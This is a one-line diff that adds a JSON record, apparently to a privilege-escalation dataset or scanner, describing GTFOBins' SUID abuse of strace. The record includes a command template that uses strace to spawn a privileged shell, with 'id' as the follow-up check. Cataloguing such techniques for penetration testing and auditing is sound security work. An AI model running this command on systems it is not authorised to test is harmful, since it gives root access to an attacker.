@@ -1,0 +1,1 @@
+{"id":"suid_strace","category":"SUID_GTFOBINS","binary":"strace","cve":null,"exploitation":["{{binary}} -o /dev/null {{shell}} -p"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["suid","gtfobins"],"severity":"high"}
